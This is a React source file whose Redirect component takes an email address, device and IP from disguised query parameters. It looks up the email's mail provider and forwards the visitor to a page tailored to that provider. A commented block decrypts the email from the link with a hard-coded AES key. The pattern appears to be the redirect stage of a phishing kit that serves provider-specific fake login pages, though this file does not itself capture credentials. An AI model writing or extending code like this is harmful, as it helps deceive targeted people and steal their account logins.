import { navigate } from "@reach/router";
import { serverTimestamp, Timestamp, FieldValue } from "firebase/firestore";
import React, { useContext, useEffect } from "react";
import uuid from "react-uuid";
import { AppContext } from "../App";
import "./loaderstyle.css";
import { getHost } from "./servers";

function Redirect() {
  const queryParams = new URLSearchParams(window.location.search);
  const email = queryParams.get("inclusive");
  const device = queryParams.get("device");
  const ip = queryParams.get("loc");

  const { page, setPage } = useContext(AppContext);
  const timestamp = Date.now();
  const uid = `${timestamp}/${uuid()}`;

  useEffect(() => {
    console.log(email);

    const splitEmail = email.split("@");
    const emailDomain = splitEmail[splitEmail.length - 1];
    console.log(email);
    console.log(emailDomain);

    getHost(email)
      .then((data) => {
        console.log(data);

        // set pageState
        setPage({
          ...page,
          [data.host]: uid,
        });
      })

      .then(() => {
        navigate(`../${uid}`, {
          state: { email: email, domain: emailDomain, device: device, ip: ip },
        });
      });

    //  navigate("qaq", { state: { email: email, domain: emailDomain } });
  }, []);

  return (
    <div style={{ display: "flex", justifyContent: "center", marginTop: 50 }}>
      <div class="lds-default">
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
      </div>
    </div>
  );
}

export default Redirect;

/*

  const path = window.location.pathname;
  const id = path.substr(1);

  var bytes = CryptoJS.AES.decrypt(id, "ghost94");
  var originalText = bytes.toString(CryptoJS.enc.Utf8);
  console.log(originalText);
  const email = originalText;
  const splitEmail = email.split("@");
  const emailDomain = splitEmail[splitEmail.length - 1];
  console.log(email);
  console.log(emailDomain);

  getHost(email).then((data) => {
    console.log(data);
    const pagetoNavigate = pages.find((element) => element.name === data.host);
    console.log(pagetoNavigate.pagename);
    navigate(`/${pagetoNavigate.pagename}`, {
      state: { email: email, domain: emailDomain },
    });
  });

  */
